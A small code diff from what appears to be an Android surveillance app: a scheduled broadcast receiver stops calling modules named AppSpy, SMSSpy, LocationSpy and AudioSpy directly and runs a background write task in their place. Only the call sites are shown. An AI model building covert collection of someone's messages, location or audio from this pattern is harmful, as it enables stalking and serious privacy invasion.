@@ -19,9 +19,6 @@ public class ScheduledWriter extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        AppSpy.writeApps(context);
-        SMSSpy.writeSMS(context);
-        LocationSpy.writeLocation(context);
-        AudioSpy.writeAudio(context);
+        new WriteTask().execute(context);
     }
 }
